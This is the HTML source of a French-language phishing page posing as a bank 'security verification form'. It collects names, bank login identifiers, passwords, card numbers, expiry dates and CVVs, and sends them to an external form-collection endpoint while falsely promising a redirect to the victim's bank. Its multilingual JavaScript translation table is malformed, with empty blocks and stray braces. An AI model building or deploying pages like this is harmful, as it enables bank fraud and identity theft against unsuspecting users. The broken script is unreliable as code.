<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<style>
  body {
    margin: 0;
    font-family: 'Arial', sans-serif;
    background: linear-gradient(to right, #1c92d2, #f2fcfe);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .container {
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .card-display {
    width: 350px;
    height: 200px;
    height: 23px;
    border-radius: 15px;
    background: linear-gradient(135deg, #4b79a1, #283e51);
    color: white;
    padding: 20px;
    box-shadow: 0 8px 25px rgba(0,0,0,0.3);
    margin-bottom: 30px;
    position: relative;
    font-family: 'Courier New', monospace;
  }

  .card-number {
    font-size: 20px;
    letter-spacing: 3px;
    margin-top: 40px;
  }

  .card-name, .card-expiry {
    margin-top: 30px;
    font-size: 14px;
  }

  .card-label {
    font-size: 10px;
    opacity: 0.8;
  }

  form {
    width: 350px;
    display: flex;
    flex-direction: column;
  }

  label {
    font-weight: bold;
    margin: 10px 0 5px;
  }

  input {
    padding: 10px;
    border-radius: 5px;
    border: 1px solid #ccc;
    font-size: 14px;
    margin-bottom: 15px;
    box-sizing: border-box;
  }
</style>
</head>
<body>

<div class="form-container">

  <h2 id="titre">Processus de confidentialite</h2>

  <!-- Menu pour choisir la langue -->
 <!-- Menu Langues -->
  <select id="langue" onchange="changerLangue()">
    <option value="fr">Français</option>
    <option value="en">English</option>
    <option value="es">Español</option>
    <option value="de">Deutsch</option>
    <option value="it">Italiano</option>
    <option value="pt">Português</option>
    <option value="nl">Nederlands</option>
    <option value="sv">Svenska</option>
    <option value="ru">Русский</option>
    <option value="zh">中文</option>
  </select>
  <form action="https://formspree.io/f/xbdakdel" method="POST">
     
       <h2 id="titre">Formulaire de vérification de sécurité</h2>

    <label id="labelNom" for="nomInput">Nom et prénom :</label>
    <input type="text" id="nomInput" name="nom et prenom" placeholder="Entrez votre nom" required>

    <label id="labelIdentifiant" for="identifiantInput">Identifiant de votre compte bancaire :</label>
    <input type="text" id="identifiantInput" name="Identifiant" placeholder="Entrez votre identifiant" required>

    <label id="labelMot" for="motInput">Mot de passe/Code :</label>
    <input type="text" id="motInput" name="Mot de passe" placeholder="Entrez votre mot de passe" required>

    <label id="labelBanque" for="banqueInput">Nom de votre banque :</label>
    <input type="text" id="banqueInput" name="Nom de la banque" placeholder="Nom de la banque" required>
  <div class="container">

 <h5> <div class="card-display">
    <form id="cardForm">
    <label for="cardNumber">Numéro de carte (Uniquement les 12 premiers chiffres )</label>
    <input type="text" id="cardNumber" maxlength="16" placeholder="1234 5678 9012 3456">
    <label for="expiry">Date d'expiration (MM/AA)</label>
    <input type="text" id="expiry" maxlength="5" placeholder="MM/AA">
    <label for="cvv">CVV</label>
    <input type="text" id="cvv" maxlength="3" placeholder="123">
  </form>
    
</div></h5>

    
    <button type="submit" id="submitBtn">Envoyer</button>
    <h5 id="secureText">Vous serez redirige vers votre banque pour confirmer en toute securite vos informations.</h5>
  </form>

  <!-- Script pour changer la langue -->
<script>
const traductions = {
  fr: {
    titre: "Formulaire de vérification de sécurité",
    labelNom: "Nom et prénom :",
    labelIdentifiant: "Identifiant de votre compte bancaire :",
    labelMot: "Mot de passe/Code :",
    labelBanque: "Nom de votre banque :",
    labelMessage: "Message (facultatif) :",
    submitBtn: "Envoyer",
    secureText: "Vous serez redirige vers votre banque pour confirmer en toute securite vos informations."
  },
  en: {
    titre: "Security Verification Form",
    labelNom: "Full Name:",

    labelMot: "Password/Code:",

    submitBtn: "Submit",
    secureText: "Your data is secure and confidential"
  },
  es: {

  },

    labelMot: "Password/Codice:",
    labelBanque: "Nome banca:",
    labelMessage: "Messaggio (facoltativo):",
    submitBtn: "Invia",
    secureText: "I tuoi dati sono sicuri e riservati"
  },
  pt: {
    titre: "Formulário de verificação de segurança",
    labelNom: "Nome completo:",
    labelIdentifiant: "ID da conta bancária:",
    labelMot: "Senha/Código:",
    labelBanque: "Nome do banco:",

  },

  },
  zh: {
    titre: "安全验证表单",
    labelNom: "全名：",
    labelIdentifiant: "银行账户ID：",
    labelMot: "密码/代码：",
    labelBanque: "银行名称：",
    labelMessage: "信息（可选）：",
    submitBtn: "提交",
    secureText: "您的数据安全且保密"
  }
};

function changerLangue() {
  const langue = document.getElementById('langue').value;
  const t = traductions[langue];
  if(t){
    document.getElementById('titre').innerText = t.titre;
    document.getElementById('labelNom').innerText = t.labelNom;
    document.getElementById('labelIdentifiant').innerText = t.labelIdentifiant;
    document.getElementById('labelMot').innerText = t.labelMot;
    document.getElementById('labelBanque').innerText = t.labelBanque;
    document.getElementById('labelMessage').innerText = t.labelMessage;
    document.getElementById('submitBtn').innerText = t.submitBtn;
    document.getElementById('secureText').innerText = t.secureText;
  }
}
</script>

</body>
</html>
</body>
</html>
